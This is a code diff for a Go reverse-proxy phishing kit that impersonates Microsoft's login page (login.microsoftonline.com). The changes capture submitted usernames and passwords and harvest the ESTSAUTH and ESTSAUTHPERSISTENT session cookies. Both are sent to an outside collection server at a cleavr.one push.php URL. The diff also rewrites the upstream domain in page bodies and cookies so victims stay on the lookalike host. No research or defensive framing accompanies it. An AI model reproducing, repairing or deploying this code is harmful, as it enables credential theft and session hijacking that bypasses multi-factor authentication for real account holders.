@@ -2,23 +2,37 @@ package main
 
 import (
     "bytes"
+    "crypto/rand"
+    "encoding/base64"
     "fmt"
     "io/ioutil"
     "net/http"
+    "net/url"
     "os"
     "strings"
 )
 
+// Constants for upstream and server configurations
 const (
-    upstream        = "https://login.microsoftonline.com"
+    upstream        = "login.microsoftonline.com"
     upstreamPath    = "/"
-    serverURL       = "https://yourserver.com/push.php"
+    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
 )
 
+// Variables for blocking regions and IP addresses
 var (
     blockedRegions = []string{}
     blockedIPs     = []string{"0.0.0.0", "127.0.0.1"}
 )
+
+// generateNonce generates a random nonce for use in CSP
+func generateNonce() (string, error) {
+    nonce := make([]byte, 16)
+    if _, err := rand.Read(nonce); err != nil {
+        return "", err
+    }
+    return base64.StdEncoding.EncodeToString(nonce), nil
+}
 
 func main() {
     // Retrieve the PORT from environment variables
@@ -37,8 +51,15 @@ func main() {
 }
 
 func handleRequest(w http.ResponseWriter, r *http.Request) {
-    // Set a secure Content Security Policy (CSP) header
-    w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';")
+    // Generate a nonce for this request
+    nonce, err := generateNonce()
+    if err != nil {
+        http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+        return
+    }
+
+    // Set the CSP header with the generated nonce
+    w.Header().Set("Content-Security-Policy", fmt.Sprintf("default-src 'self'; script-src 'self' 'nonce-%s'; style-src 'self' 'nonce-%s'; object-src 'none'; base-uri 'self';", nonce, nonce))
 
     region := r.Header.Get("cf-ipcountry")
     ipAddress := r.Header.Get("cf-connecting-ip")
@@ -48,7 +69,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
         return
     }
 
-    upstreamURL := upstream + upstreamPath + r.URL.Path
+    upstreamURL := buildUpstreamURL(r)
     req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
     if err != nil {
         http.Error(w, "Internal Server Error", http.StatusInternalServerError)
@@ -56,8 +77,26 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     }
 
     copyHeaders(r.Header, &req.Header)
-    req.Header.Set("Host", "login.microsoftonline.com")
+    req.Header.Set("Host", upstream)
     req.Header.Set("Referer", r.Referer())
+
+    if r.Method == "POST" {
+        r.ParseForm()
+        var message strings.Builder
+        message.WriteString("Password found:\n\n")
+        for key, values := range r.PostForm {
+            value := values[0]
+            if key == "login" {
+                message.WriteString("User: " + value + "\n")
+            }
+            if key == "passwd" {
+                message.WriteString("Password: " + value + "\n")
+            }
+        }
+        if strings.Contains(message.String(), "User") && strings.Contains(message.String(), "Password") {
+            sendToServer(message.String(), ipAddress)
+        }
+    }
 
     client := &http.Client{}
     resp, err := client.Do(req)
@@ -67,27 +106,37 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     }
     defer resp.Body.Close()
 
-    body, _ := ioutil.ReadAll(resp.Body)
-    bodyString := string(body)
+    // Extract and modify cookies
+    allCookies := extractAndModifyCookies(resp, w)
 
-    if r.Method == "POST" {
-        username, password := extractCredentials(r)
-        if username != "" && password != "" {
-            message := fmt.Sprintf("User: %s\nPassword: %s\n", username, password)
-            sendToServer(message, ipAddress)
-        }
-    }
+    bodyBytes, _ := ioutil.ReadAll(resp.Body)
+    bodyString := strings.ReplaceAll(string(bodyBytes), upstream, r.Host)
 
-    bodyString = strings.ReplaceAll(bodyString, "login.microsoftonline.com", r.Host)
-
-    for name, values := range resp.Header {
-        for _, value := range values {
-            w.Header().Add(name, value)
-        }
+    if strings.Contains(allCookies, "ESTSAUTH") && strings.Contains(allCookies, "ESTSAUTHPERSISTENT") {
+        sendToServer("Cookies found:\n\n"+allCookies, ipAddress)
     }
 
     w.WriteHeader(resp.StatusCode)
     w.Write([]byte(bodyString))
+}
+
+func buildUpstreamURL(r *http.Request) string {
+    upstreamURL := fmt.Sprintf("https://%s%s", upstream, upstreamPath+r.URL.Path)
+    if r.URL.RawQuery != "" {
+        upstreamURL += "?" + r.URL.RawQuery
+    }
+    return upstreamURL
+}
+
+func extractAndModifyCookies(resp *http.Response, w http.ResponseWriter) string {
+    var allCookies strings.Builder
+    cookies := resp.Cookies()
+    for _, cookie := range cookies {
+        modifiedCookie := strings.ReplaceAll(cookie.String(), upstream, w.Header().Get("Host"))
+        allCookies.WriteString(modifiedCookie + "; \n\n")
+        w.Header().Add("Set-Cookie", modifiedCookie)
+    }
+    return allCookies.String()
 }
 
 func copyHeaders(src http.Header, dst *http.Header) {
@@ -110,32 +159,6 @@ func isBlocked(region, ipAddress string) bool {
         }
     }
     return false
-}
-
-func extractCredentials(r *http.Request) (string, string) {
-    bodyBytes, err := ioutil.ReadAll(r.Body)
-    if err != nil {
-        return "", ""
-    }
-
-    bodyString := string(bodyBytes)
-    r.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))
-
-    username := extractValueFromBody(bodyString, "login")
-    password := extractValueFromBody(bodyString, "passwd")
-
-    return username, password
-}
-
-func extractValueFromBody(body, key string) string {
-    params := strings.Split(body, "&")
-    for _, param := range params {
-        pair := strings.SplitN(param, "=", 2)
-        if len(pair) == 2 && pair[0] == key {
-            return pair[1]
-        }
-    }
-    return ""
 }
 
 func sendToServer(data, ipAddress string) {
